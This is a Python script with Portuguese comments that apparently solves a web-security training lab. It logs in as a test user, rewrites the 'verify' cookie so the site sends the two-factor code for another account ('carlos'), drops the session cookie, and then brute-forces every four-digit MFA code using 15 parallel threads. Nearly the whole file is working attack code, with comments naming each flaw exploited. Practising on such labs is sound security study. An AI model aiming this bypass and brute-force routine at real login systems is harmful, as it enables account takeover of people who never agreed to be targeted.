import requests
from concurrent.futures import ThreadPoolExecutor
import threading

# threading.Event() → cria flag compartilhada entre threads (estado inicial: False) 
# Quando uma thread encontra sucesso, seta a flag para True, e todas as outras threads param quase instantaneamente
stop_flag = threading.Event()

url = 'https://0a5e001504b3f0f780d3538d001000f4.web-security-academy.net'
headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}
data = {
    "username": "wiener",
    "password": "peter"
} 
# allow_redirects=False não permite redirecionamento automático tornando possível inspecionar o status 3xx.
response = requests.post(url+"/login", data=data, headers=headers, allow_redirects=False)

# ANÁLISE:

print("Status Code:", response.status_code)
# -> Status Code: 302

print("Headers:", response.headers)
# -> Headers:{
#        'Location': '/login2',
#        'Set-Cookie': 'verify=wiener; session=zzzzzzzzzzzzzzzzzzzzzzzzz'
#    }
print("########################################################")

# Vulnerabilidade 1: Depende de parâmetros do lado do cliente para executar decisões de autenticação,
# no caso, o token 'verify' determina o usuário para o qual a aplicação irá enviar o código de verificação via e-mail
# Ataque: Alterar o token 'verify' para a aplicação enviar o código de autenticação para o e-mail de 'carlos'
cookies = {
    "verify": "carlos"
}
# Vulnerabilidade 2: O gerenciamento de sessão está quebrado, pois mesmo excluindo o token 'session'
# é possível acessar a página de verificação de código de 2FA que deveria ser autenticada, 
# Ataque: Eliminar o token 'session' pois  está vinculado ao usuário 'wiener' 

# Enviando a request redirecionada alterada (back-end envia o código de autenticação para o e-mail do 'carlos')
response = requests.get(url+"/login2", cookies=cookies)

# Vulnerabilidade 3: Sem proteção contra força bruta 
# Ataque de força bruta no código de verificação de 2FA de 4 dígitos utilizando multithreads
def worker(start, end):
    for i in range(start, end):
        
        if stop_flag.is_set():
            return

        code = f"{i:04d}"
        print(f"Testando {code}")

        data = {
            "mfa-code": f"{i:04d}"
        } 
        response = requests.post(url+"/login2", data=data, cookies=cookies, headers=headers)

        if "Incorrect security code" in response.text:
            pass
        else:
            stop_flag.set()
            print(f"[!!!] CÓDIGO ENCONTRADO: {code}")
            print(response.text)
            break


n_threads = 15
ranges = []
step = 10000 // n_threads # Operador // → Arredonda o resultado da divisão para o menor inteiro mais próximo

for i in range(n_threads):
    start = i * step
    if i < n_threads-1:
        end = (i + 1) * step
    else:
        end = 10000
    ranges.append((start, end))

# ThreadPoolExecutor() → cria um pool de threads gerenciado pelo 'executor'
# Executa a função attempt_range para cada item dentro de ranges, executando em paralelo com n_threads
with ThreadPoolExecutor(max_workers=n_threads) as executor:
    results = executor.map(lambda r: worker(*r), ranges)